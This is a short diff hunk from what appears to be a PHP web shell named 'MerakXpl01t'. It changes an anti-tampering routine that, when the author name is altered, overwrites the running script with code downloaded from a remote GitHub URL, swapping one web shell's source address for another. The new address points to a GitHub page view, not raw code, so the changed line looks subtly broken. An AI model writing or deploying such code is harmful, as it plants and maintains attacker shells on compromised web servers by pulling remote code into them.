@@ -1222,7 +1222,7 @@ function shell()
 if (author != 'MerakXpl01t') {
    $file = basename($_SERVER['SCRIPT_FILENAME']);
    $open = fopen($file, 'w');
-   fwrite($open, file_get_contents('https://raw.githubusercontent.com/dmzhari/ecchi-shell/main/ecchishell.php'));
+   fwrite($open, file_get_contents('https://github.com/didin-pixel/MerakXpl01t/blob/main/merakxpl01t.php'));
    fclose($open);
 
    echo '<script>alert("Please Dont Change Author!!")</script>';
